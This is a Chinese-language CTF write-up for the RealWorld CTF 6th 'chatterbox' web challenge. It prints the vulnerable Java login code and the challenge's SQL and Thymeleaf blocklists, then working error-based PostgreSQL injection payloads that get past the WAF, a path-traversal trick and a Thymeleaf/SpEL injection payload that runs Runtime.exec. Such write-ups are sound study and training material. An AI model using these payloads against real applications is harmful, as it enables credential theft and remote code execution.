<!DOCTYPE html>
<html lang="zh-CN">
    <head prefix="og: https://ogp.me/ns#">
  <meta charset="utf-8">
  <meta name="referrer" content="no-referrer" />
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="color-scheme" content="light dark">
  
  <title>RealWorld CTF 6th 正赛/体验赛 部分 Web Writeup - Boogiepop Doesn&#39;t Laugh</title>
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    <link rel='manifest' href='/manifest.json'>
  

  
  
  
  <meta property="og:title" content="RealWorld CTF 6th 正赛/体验赛 部分 Web Writeup - Boogiepop Doesn&#39;t Laugh" />
  
  <meta property="og:type" content="article" />
  
  <meta property="og:url" content="http://example.com/2024/01/29/RealWorld%20CTF%206th%20%E6%AD%A3%E8%B5%9B_%E4%BD%93%E9%AA%8C%E8%B5%9B%20%E9%83%A8%E5%88%86%20Web%20Writeup/index.html" />
  
  <meta property="og:image" content="/favicon.png" />
  
  <meta property="og:article:published_time" content="2024-01-29T10:45:24.000Z" />
  
  <meta property="og:article:author" content="Boogipop" />
  
  

  
<link rel="stylesheet" href="/css/var.css">

  
<link rel="stylesheet" href="/css/main.css">

  
<link rel="stylesheet" href="/css/typography.css">

  
<link rel="stylesheet" href="/css/code-highlighting.css">

  
<link rel="stylesheet" href="/css/components.css">

  
<link rel="stylesheet" href="/css/nav.css">

  
<link rel="stylesheet" href="/css/paginator.css">

  
<link rel="stylesheet" href="/css/footer.css">

  
<link rel="stylesheet" href="/css/post-list.css">

  
<link rel="stylesheet" href="/css/giscus.css">

  
  
<link rel="stylesheet" href="/css/rainbow-banner.css">

  
  
  
<link rel="stylesheet" href="/css/toc.css">

  
  
    
<link rel="stylesheet" href="/css/giscus.css">

  
  
  
  
<link rel="stylesheet" href="/css/post.css">

  
  
  
  
  

  
<meta name="generator" content="Hexo 6.3.0"></head>
    <body
        data-color-scheme="auto"
        data-uppercase-categories="true"
        
        data-rainbow-banner="true"
        data-rainbow-banner-shown="auto"
        data-rainbow-banner-month="6"
        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
        
        data-config-root="/"
        
        data-toc="true"
        data-toc-max-depth="2"
        
        
    >
        <nav id="theme-nav">
    <div class="inner">
        <a class="title" href="/">Blog</a>
        <div class="nav-arrow"></div>
        <div class="nav-items">
            <a class="nav-item nav-item-home" href="/">Home</a>
            
            
            <a class="nav-item" href="/archives">Archives</a>
            
            
            
            <a class="nav-item" href="/friends">Friends</a>
            
            
            
            <a class="nav-item" href="/about">About</a>
            
            
            
            <a class="nav-item" href="/categories">Categories</a>
            
            
            
            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/MrWillCom" target="_blank" aria-label="GitHub">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-codepen nav-item-icon" href="https://codepen.io/mrwillcom" target="_blank" aria-label="CodePen">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-patreon nav-item-icon" href="https://www.patreon.com/MrWillCom" target="_blank" aria-label="Patreon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-mastodon nav-item-icon" href="https://noc.social/@MrWillCom" target="_blank" aria-label="Mastodon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-discord nav-item-icon" href="https://discord.gg/UKuFDjcfY8" target="_blank" aria-label="Discord">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
            
            
        </div>
    </div>
</nav>
        
<article class="post">
    <div class="meta">
        
        <div class="categories text-uppercase">
        
            <a href="/categories/WriteUp/">WriteUp</a>
        
        </div>
        

        
        <div class="date" id="date">
            <span>January</span>
            <span>29,</span>
            <span>2024</span>
        </div>
        

        <h2 class="title">RealWorld CTF 6th 正赛/体验赛 部分 Web Writeup</h2>
    </div>

    <div class="divider"></div>

    <div class="content">
        <h1 id="chatterbox（solved）"><a href="#chatterbox（solved）" class="headerlink" title="chatterbox（solved）"></a>chatterbox（solved）</h1><p>考点：PSQL报错注入、Thymeleaf模板注入<br>一开始咱以为是psql的盲注，但盲注确实也可以，但是我发现好像可以直接error-base。。。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">doLogin</span><span class="params">(HttpServletRequest request, Model model, HttpSession session)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;username&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;passwd&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (username != <span class="literal">null</span> &amp;&amp; password != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (SQLCheck.checkBlackList(username) &amp;&amp; SQLCheck.checkBlackList(password)) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;SELECT id,passwd FROM message_users WHERE username = &#x27;&quot;</span> + username + <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">                <span class="keyword">if</span> (SQLCheck.check(sql)) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        List&lt;String&gt; pass = <span class="built_in">this</span>.jdbcTemplate.query(sql, <span class="keyword">new</span> <span class="title class_">RowMapper</span>&lt;String&gt;() &#123;</span><br><span class="line">                            <span class="keyword">public</span> String <span class="title function_">mapRow</span><span class="params">(ResultSet rs, <span class="type">int</span> rowNum)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">                                <span class="keyword">try</span> &#123;</span><br><span class="line">                                    <span class="type">String</span> <span class="variable">var10000</span> <span class="operator">=</span> rs.getString(<span class="number">1</span>);</span><br><span class="line">                                    <span class="keyword">return</span> var10000 + <span class="string">&quot;/&quot;</span> + rs.getString(<span class="number">2</span>);</span><br><span class="line">                                &#125; <span class="keyword">catch</span> (java.sql.SQLException var4) &#123;</span><br><span class="line">                                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(var4);</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;);</span><br><span class="line">                        <span class="keyword">if</span> (!pass.isEmpty()) &#123;</span><br><span class="line">                            String[] info = ((String)pass.get(<span class="number">0</span>)).split(<span class="string">&quot;/&quot;</span>);</span><br><span class="line">                            <span class="type">String</span> <span class="variable">dbPassword</span> <span class="operator">=</span> info[<span class="number">1</span>];</span><br><span class="line">                            <span class="keyword">if</span> (dbPassword != <span class="literal">null</span> &amp;&amp; dbPassword.equals(password)) &#123;</span><br><span class="line">                                <span class="type">int</span> <span class="variable">userId</span> <span class="operator">=</span> Integer.parseInt(info[<span class="number">0</span>]);</span><br><span class="line">                                session.setAttribute(<span class="string">&quot;userId&quot;</span>, userId);</span><br><span class="line">                                <span class="keyword">return</span> <span class="string">&quot;redirect:/&quot;</span>;</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            model.addAttribute(<span class="string">&quot;status&quot;</span>, <span class="number">500</span>);</span><br><span class="line">                            model.addAttribute(<span class="string">&quot;message&quot;</span>, <span class="string">&quot;Incorrect Username/Password～&quot;</span>);</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            model.addAttribute(<span class="string">&quot;status&quot;</span>, <span class="number">500</span>);</span><br><span class="line">                            model.addAttribute(<span class="string">&quot;message&quot;</span>, <span class="string">&quot;Incorrect Username/Password～&quot;</span>);</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">return</span> <span class="string">&quot;error&quot;</span>;</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (Exception var11) &#123;</span><br><span class="line">                        model.addAttribute(<span class="string">&quot;status&quot;</span>, <span class="number">500</span>);</span><br><span class="line">                        model.addAttribute(<span class="string">&quot;message&quot;</span>, var11.toString());</span><br><span class="line">                        <span class="keyword">return</span> <span class="string">&quot;error&quot;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    model.addAttribute(<span class="string">&quot;status&quot;</span>, <span class="number">500</span>);</span><br><span class="line">                    model.addAttribute(<span class="string">&quot;message&quot;</span>, <span class="string">&quot;check error~&quot;</span>);</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;error&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                model.addAttribute(<span class="string">&quot;status&quot;</span>, <span class="number">500</span>);</span><br><span class="line">                model.addAttribute(<span class="string">&quot;message&quot;</span>, <span class="string">&quot;Ban!&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;error&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;login&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这一段就是这道题的主要代码，是一个Psql的注入，注入点就是username，想要注入成功需要通过Waf，waf如下<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1706508024405-28186b9a-3233-4be1-bd01-d3a187cede4c.png#averageHue=%23292d36&clientId=ue263ffd8-76af-4&from=paste&height=267&id=ua9fa69e9&originHeight=334&originWidth=988&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=38934&status=done&style=none&taskId=u8b71d42a-d397-4926-93f2-57f76c2dfff&title=&width=790.4" alt="image.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&quot;SELECT&quot;, &quot;UNION&quot;, &quot;INSERT&quot;, &quot;ALTER&quot;, &quot;SLEEP&quot;, &quot;DELETE&quot;, &quot;--&quot;, &quot;;&quot;, &quot;#&quot;, &quot;&amp;&quot;, &quot;/*&quot;, &quot;OR&quot;, &quot;EXEC&quot;, &quot;CREATE&quot;, &quot;AND&quot;, &quot;DROP&quot;, &quot;DO&quot;, &quot;COPY&quot;, &quot;SET&quot;, &quot;VACUUM&quot;, &quot;SHOW&quot;, &quot;CURSOR&quot;, &quot;TRUNCATE&quot;, &quot;CAST&quot;, &quot;BEGIN&quot;, &quot;PERFORM&quot;, &quot;END&quot;, &quot;CASE&quot;, &quot;WHEN&quot;, &quot;ALL&quot;, &quot;TABLE&quot;, &quot;UPDATE&quot;, &quot;TRIGGER&quot;, &quot;FUNCTION&quot;, &quot;PROCEDURE&quot;, &quot;DECLARE&quot;, &quot;RETURNING&quot;, &quot;TABLESPACE&quot;, &quot;VIEW&quot;, &quot;SEQUENCE&quot;, &quot;INDEX&quot;, &quot;LOCK&quot;, &quot;GRANT&quot;, &quot;REVOKE&quot;, &quot;SAVEPOINT&quot;, &quot;ROLLBACK&quot;, &quot;IMPORT&quot;, &quot;COMMIT&quot;, &quot;PREPARE&quot;, &quot;EXECUTE&quot;, &quot;EXPLAIN&quot;, &quot;ANALYZE&quot;, &quot;DATABASE&quot;, &quot;PASSWORD&quot;, &quot;CONNECT&quot;, &quot;DISCONNECT&quot;, &quot;PG_SLEEP&quot;, &quot;MERGE&quot;, &quot;USING&quot;, &quot;LIMIT&quot;, &quot;OFFSET&quot;, &quot;RETURN&quot;, &quot;ESCAPE&quot;, &quot;LIKE&quot;, &quot;ILIKE&quot;, &quot;RLIKE&quot;, &quot;EXISTS&quot;, &quot;BETWEEN&quot;, &quot;IS&quot;, &quot;NULL&quot;, &quot;NOT&quot;, &quot;GROUP&quot;, &quot;BY&quot;, &quot;HAVING&quot;, &quot;ORDER&quot;, &quot;WINDOW&quot;, &quot;PARTITION&quot;, &quot;OVER&quot;, &quot;FOREIGN KEY&quot;, &quot;REFERENCE&quot;, &quot;RAISE&quot;, &quot;LISTEN&quot;, &quot;NOTIFY&quot;, &quot;LOAD&quot;, &quot;SECURITY&quot;, &quot;OWNER&quot;, &quot;RULE&quot;, &quot;CLUSTER&quot;, &quot;COMMENT&quot;, &quot;CONVERT&quot;, &quot;COPY&quot;, &quot;CHECKPOINT&quot;, &quot;REINDEX&quot;, &quot;RESET&quot;, &quot;LANGUAGE&quot;, &quot;PLPGSQL&quot;, &quot;PLPYTHON&quot;, &quot;SECDEF&quot;, &quot;NOCREATEDB&quot;, &quot;NOCREATEROLE&quot;, &quot;NOINHERIT&quot;, &quot;NOREPLICATION&quot;, &quot;BYPASSRLS&quot;, &quot;FILE&quot;, &quot;PG_&quot;, &quot;IMPORT&quot;, &quot;EXPORT&quot;]</span><br></pre></td></tr></table></figure>
<p>过滤了很多字符串，但是可以用的东西还是有的，比如<code>chr、||、::、ln、&#39;</code>等等字符串和函数。过完这个waf还有第二个waf<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1706508152336-c505062e-996e-40a7-a688-c2e7c3d57dc4.png#averageHue=%23292e36&clientId=ue263ffd8-76af-4&from=paste&height=377&id=u31d76e6b&originHeight=471&originWidth=1322&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=102792&status=done&style=none&taskId=ucb171fc6-8541-47af-8426-e52b6c9bf4e&title=&width=1057.6" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1706508157840-809a8954-02e7-4e03-a4b6-34842474570c.png#averageHue=%23292e38&clientId=ue263ffd8-76af-4&from=paste&height=110&id=u48cfdc24&originHeight=138&originWidth=691&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=15083&status=done&style=none&taskId=ua0051451-7bf8-4e8f-9c7d-a84fb5d4783&title=&width=552.8" alt="image.png"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">checkValid</span><span class="params">(String sql)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> SQLParser.parse(sql);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SQLException var9) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                List&lt;SQLStatement&gt; sqlStatements = SQLUtils.parseStatements(sql, JdbcConstants.POSTGRESQL);</span><br><span class="line">                <span class="keyword">if</span> (sqlStatements != <span class="literal">null</span> &amp;&amp; sqlStatements.size() &gt; <span class="number">1</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="type">Iterator</span> <span class="variable">sqlIterator</span> <span class="operator">=</span> sqlStatements.stream().iterator();</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">while</span>(sqlIterator.hasNext()) &#123;</span><br><span class="line">                        <span class="type">SQLStatement</span> <span class="variable">statement</span> <span class="operator">=</span> (SQLStatement)sqlIterator.next();</span><br><span class="line">                        <span class="keyword">if</span> (statement <span class="keyword">instanceof</span> PGSelectStatement) &#123;</span><br><span class="line">                            <span class="type">SQLSelect</span> <span class="variable">sqlSelect</span> <span class="operator">=</span> ((SQLSelectStatement)statement).getSelect();</span><br><span class="line">                            <span class="type">SQLSelectQuery</span> <span class="variable">sqlSelectQuery</span> <span class="operator">=</span> sqlSelect.getQuery();</span><br><span class="line">                            <span class="keyword">if</span> (sqlSelectQuery <span class="keyword">instanceof</span> SQLUnionQuery) &#123;</span><br><span class="line">                                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="type">SQLSelectQueryBlock</span> <span class="variable">sqlSelectQueryBlock</span> <span class="operator">=</span> (SQLSelectQueryBlock)sqlSelectQuery;</span><br><span class="line">                            <span class="keyword">if</span> (!filtetFields(sqlSelectQueryBlock.getSelectList())) &#123;</span><br><span class="line">                                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">if</span> (!filterTableName((SQLExprTableSource)sqlSelectQueryBlock.getFrom())) &#123;</span><br><span class="line">                                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">if</span> (!filterWhere(sqlSelectQueryBlock.getWhere())) &#123;</span><br><span class="line">                                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception var8) &#123;</span><br><span class="line">                <span class="keyword">if</span> (filter(sql)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SQLException</span>(<span class="string">&quot;SQL Parsing Exception~&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>这一段需要注意一下，其实到这一段我觉得和tpctf的那个xss有点像，这里也有2个异常处理，需要注意的点就是到了第二个异常处理的时候有个filter<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1706508214430-c341994e-93ca-4696-af6b-6a39336b61cd.png#averageHue=%23292d36&clientId=ue263ffd8-76af-4&from=paste&height=365&id=u1e16600c&originHeight=456&originWidth=1345&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=57542&status=done&style=none&taskId=ud0aa70e3-c1e4-41af-a109-2f8caee6fc2&title=&width=1076" alt="image.png"><br>这个filter十分奇怪，只要字符串有<code>USER_DEFINE</code>、<code>SELECT</code>、<code>VIEW</code>就会为true，那么也就通过了这个waf，我们需要做的也就是进入第二层异常处理。<br>我们输入<code>&#39;||ln((1=1)::int)||&#39;</code>时，看看会发生什么<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1706508312193-d0942912-8cb1-4c05-95a4-f4cf828dd705.png#averageHue=%232b2f37&clientId=ue263ffd8-76af-4&from=paste&height=648&id=ua37e356f&originHeight=810&originWidth=1655&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=200674&status=done&style=none&taskId=udabfddb8-bd4e-45e3-9640-4bece9ab668&title=&width=1324" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1706508383112-0ae416b7-7636-4a50-b16a-b225540e3c39.png#averageHue=%2332353e&clientId=ue263ffd8-76af-4&from=paste&height=425&id=u79744d76&originHeight=531&originWidth=1525&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=79033&status=done&style=none&taskId=u2375c499-4248-4439-a956-21af4da94d7&title=&width=1220" alt="image.png"><br>我们只进入了第一层的异常处理，然后就出去了。我们进入第一层异常处理很简单，只需要让其报错就行了，比如将字符串类型墙砖为int<code>&#39; ||passwd::int||&#39; </code>这样就进入了第二层，那么假如我们想进入第二层异常的话就是语法错误了。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1706508811000-d2fb781b-e142-4e4d-9f2c-e2b41c910c23.png#averageHue=%23292d36&clientId=ue263ffd8-76af-4&from=paste&height=208&id=u85237fec&originHeight=260&originWidth=1300&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=56632&status=done&style=none&taskId=u0333c7b3-efae-485e-84aa-bde8000292b&title=&width=1040" alt="image.png"><br>那么我们只需要输入一点不存在的语法，payload如下<br><code>&#39; ||passwd::int||asdasd&#39;</code><br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1706508844840-31e356a1-cac0-4784-8845-de7d6e289cb5.png#averageHue=%23333740&clientId=ue263ffd8-76af-4&from=paste&height=430&id=u19012e02&originHeight=538&originWidth=1439&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=91388&status=done&style=none&taskId=u694d1822-c8c4-481f-b30e-c0292981216&title=&width=1151.2" alt="image.png"><br>我们成功进入了filter函数，可以看到报错就是语法错误，进入了filter我们只需要让payload包含上述说的USERDEFINE就可以了，最终payload如下<br><code>&#39; ||passwd::int||asdasd&#39; USER_DEFINE </code><br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1706508893689-3ee91767-f9b1-4a37-ba79-8c1c079f2523.png#averageHue=%232b2e35&clientId=ue263ffd8-76af-4&from=paste&height=574&id=u5d8c1ec3&originHeight=717&originWidth=1437&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=101543&status=done&style=none&taskId=u6acb4ed1-bd25-4a36-9a31-2fdedc48c9b&title=&width=1149.6" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1706508929642-0fa37388-5f83-4434-96ad-b0f12c5d604c.png#averageHue=%23fefdfc&clientId=ue263ffd8-76af-4&from=paste&height=306&id=u77e64b30&originHeight=382&originWidth=928&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=42844&status=done&style=none&taskId=u205b35de-e414-4084-b6dd-514adab072f&title=&width=742.4" alt="image.png"><br>这样无法error-base看到密码，所以需要稍微改进一下<br><code>&#39; ||passwd::int||TEXT&#39; USER_DEFINE </code><br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1706509415870-34fcd06e-fede-4626-b029-a3ef34c72b72.png#averageHue=%23fefdfd&clientId=ue263ffd8-76af-4&from=paste&height=406&id=udf45c563&originHeight=507&originWidth=1014&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=51316&status=done&style=none&taskId=u6be9301b-63a9-423e-9317-9a01858bb75&title=&width=811.2" alt="image.png"><br>这样我们就完成了error-base的rce了。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1706509559305-51b2ca4f-b3ed-43f3-aa8a-a4a3ef6e2403.png#averageHue=%23fefdfd&clientId=ue263ffd8-76af-4&from=paste&height=426&id=u607e5854&originHeight=533&originWidth=948&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=54930&status=done&style=none&taskId=u6a46b4de-cff8-4e31-bf4a-8751a5160f7&title=&width=758.4" alt="image.png"><br>远程环境拿到了key后我们就可以进一步去解题了，这道题的第二步是一个thymeleaf的模板注入。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1706509615986-853a43d2-d775-4a5c-bbd5-9def32ec300f.png#averageHue=%23292d36&clientId=ue263ffd8-76af-4&from=paste&height=553&id=uf2cacda6&originHeight=691&originWidth=1373&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=108724&status=done&style=none&taskId=ub0231bd7-bf4f-483c-99c2-7ad0e4bd15a&title=&width=1098.4" alt="image.png"><br>在这里会用thymeleaf进行模板渲染。并且做了一些过滤。&#96;&#96;</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return !templateContent.contains(&quot;&lt;&quot;) &amp;&amp; !templateContent.contains(&quot;&gt;&quot;) &amp;&amp; !templateContent.contains(&quot;org.apache&quot;) &amp;&amp; !templateContent.contains(&quot;org.spring&quot;);</span><br></pre></td></tr></table></figure>
<p>不允许出现&lt;&gt;，这个可以绕过。那么我们现在就来寻找一个payload。<br>需要渲染需要绕过一下它给的路径<code>file://no_exists/[payload].html</code>，我们插入的地方是payload处，解决方法就是<code>file://no_exists/..\etc/passwd%23</code>就行了。<br>接下来我们来调试寻找一下payload，由于ban掉了<code>&lt;&gt;</code>，我们只能用内联表达式去绕过</p>
<ul>
<li>[[payload]]&#x3D;th:text</li>
</ul>
<p>最终我找的payload如下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[[$&#123;T(java.lang.Boolean).forName(<span class="string">&quot;com.fasterxml.jackson.databind.ObjectMapper&quot;</span>).newInstance().readValue(<span class="string">&quot;&#123;&#125;&quot;</span>,T(org.springframework.expression.spel.standard.SpelExpressionParser)).parseExpression(<span class="string">&quot;T(Runtime).getRuntime().exec(&#x27;whoami&#x27;)&quot;</span>).getValue()&#125;]]</span><br></pre></td></tr></table></figure>
<p>需要绕过高版本thy的内置黑名单，如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">0 = &quot;org.springframework.beans.&quot;</span><br><span class="line">1 = &quot;org.springframework.aspects.&quot;</span><br><span class="line">2 = &quot;javax0.geci.&quot;</span><br><span class="line">3 = &quot;org.javassist.&quot;</span><br><span class="line">4 = &quot;com.squareup.javapoet.&quot;</span><br><span class="line">5 = &quot;javassist.&quot;</span><br><span class="line">6 = &quot;org.objectweb.asm.&quot;</span><br><span class="line">7 = &quot;net.sf.cglib.&quot;</span><br><span class="line">8 = &quot;org.springframework.javapoet.&quot;</span><br><span class="line">9 = &quot;org.springframework.asm.&quot;</span><br><span class="line">10 = &quot;org.springframework.webflow.&quot;</span><br><span class="line">11 = &quot;org.springframework.cglib.&quot;</span><br><span class="line">12 = &quot;net.bytebuddy.&quot;</span><br><span class="line">13 = &quot;org.springframework.objenesis.&quot;</span><br><span class="line">14 = &quot;org.springframework.aot.&quot;</span><br><span class="line">15 = &quot;org.springframework.context.&quot;</span><br><span class="line">16 = &quot;org.objenesis.&quot;</span><br><span class="line">17 = &quot;org.mockito.&quot;</span><br><span class="line">18 = &quot;org.springframework.web.&quot;</span><br><span class="line">19 = &quot;org.aspectj.&quot;</span><br><span class="line">20 = &quot;org.springframework.util.&quot;</span><br><span class="line">21 = &quot;org.apache.bcel.&quot;</span><br><span class="line">22 = &quot;org.springframework.expression.&quot;</span><br><span class="line">23 = &quot;org.springframework.aop.&quot;</span><br><span class="line"></span><br><span class="line">0 = &quot;jakarta.&quot;</span><br><span class="line">1 = &quot;org.xml.sax.&quot;</span><br><span class="line">2 = &quot;sun.&quot;</span><br><span class="line">3 = &quot;org.ietf.jgss.&quot;</span><br><span class="line">4 = &quot;javax.&quot;</span><br><span class="line">5 = &quot;org.omg.&quot;</span><br><span class="line">6 = &quot;com.sun.&quot;</span><br><span class="line">7 = &quot;org.w3c.dom.&quot;</span><br><span class="line">8 = &quot;jdk.&quot;</span><br><span class="line">9 = &quot;java.&quot;</span><br></pre></td></tr></table></figure>
